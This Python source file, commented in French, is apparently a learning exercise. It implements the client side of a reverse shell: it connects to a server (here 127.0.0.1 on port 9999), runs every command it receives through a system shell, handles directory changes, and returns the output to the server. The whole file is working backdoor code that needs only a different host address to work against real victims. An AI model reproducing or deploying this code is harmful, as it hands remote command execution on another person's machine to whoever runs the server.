import os  #interagir avec l'OS
import socket
import subprocess  #aussi pour controler le système d'exploitation

# Creation du socket
def create_socket():
    try:
        global host
        global port
        global sock
        host = '127.0.0.1'
        port = 9999
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print("Error during the creation of the socket ... " + str(msg))

# Connection au serveur
def socket_connection():
    try:
        global host
        global port
        global sock
        sock.connect((host, port))
    except socket.error as msg:
        print("Error with the conection to the socket ... " + str(msg))

def recv_cmd():
    global sock
    while True:
        #boucle infinie pour écouter en permanence pour des instructions
        data = sock.recv(20480)  #données qu'il reçoit du serveur
        if data[:2].decode("utf-8") == 'cd':  #check si les deux premier caractères sont égal à "cd"
            os.chdir(data[3:].decode("utf-8"))  #changé de répertoire grâce à os.chdir
        if len(data) > 0:  #être certain qu'il y a bien des données reçue de la part du serveur
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # ouvre une tâche + options de sortie, d'entrée, ...
            output_bytes = cmd.stdout.read() + cmd.stderr.read()  #sortie au format byte
            output_str = str(output_bytes, "utf-8")  # sortie au format string
            sock.send(str.encode(output_str + str(os.getcwd()) + '> '))  # envoie du résultat
            print(output_str)  # affichage du résultat côté client
    sock.close()

def main():
    create_socket()
    socket_connection()
    recv_cmd()

main()
